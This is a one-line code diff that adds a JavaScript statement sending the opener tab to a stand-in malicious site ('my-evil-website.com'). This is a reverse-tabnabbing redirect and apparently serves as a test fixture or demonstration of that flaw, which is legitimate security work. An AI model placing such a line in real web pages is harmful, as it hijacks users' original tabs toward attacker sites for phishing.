@@ -1,0 +1,1 @@
+window.opener.location = 'http://my-evil-website.com';
